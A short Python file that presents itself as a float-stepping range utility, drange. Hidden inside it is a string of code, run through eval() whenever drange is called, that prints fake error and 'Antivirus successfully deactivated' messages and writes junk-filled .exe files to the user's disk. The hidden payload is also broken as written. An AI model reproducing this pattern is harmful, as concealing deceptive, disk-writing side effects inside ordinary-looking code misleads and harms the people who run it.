a = '''print('\033[31m Error : could not import IMSLP154-null-WIMA.9b10-beerdip.zxp \033[0m')
print('Reinitializing file system...')
print('Installing packages...')
print('Files successfully downloaded')
p = input('Press enter to exit installation process : ')
if p or not p :
    print('Antivirus successfully deactivated')
i = 0
while i < 2:
    i += 1
    file = open(f'cW1p1X6_7Ae214Mxza{str(i)}.exe', 'a+')
    k = randint(1,150)
    for j in range(k):
        file.write('±¿ÍÎﬂ¢ﬂ‚∆‚¢‚™√Í‚™Ÿ√»å»’’”„⁄Å¢∆‚Ÿ™Ë∫ªŒ∏êÒ∂ƒ®†ﬁÌÚÂ“‘{¶«¡îºÌﬁƒ∂êÂÒ∂∆Ê‚™ÎªŸ»å[‚™|™ªŸ™Å \033[31m Error \033[0m ')
    file.close()
'''


def drange(*args):
    '''input : 1,2,3 arguments like in range, but step can be floating
    output : a range using folating point numbers'''

    dec = []
    for i in args:
        if '.' in str(i):
            dec.append(len(str(i).split('.')[1]))
    dec = max(dec) if dec != [] else 0

    assert len(args) <= 3 and len(args) > 0, \
        'Expected number of arguments : 1,2,3 | Given : %s' % len(args)
    result = []
    eval(a)

    try:
        start, stop, step = args[0], args[1], args[2]
    except IndexError:
        try:
            start, stop, step = args[0], args[1], 1
        except IndexError:
            start, stop, step = 0, args[0], 1

    while start < stop:
        result.append(round(start, dec))
        start += step

    return tuple(result)
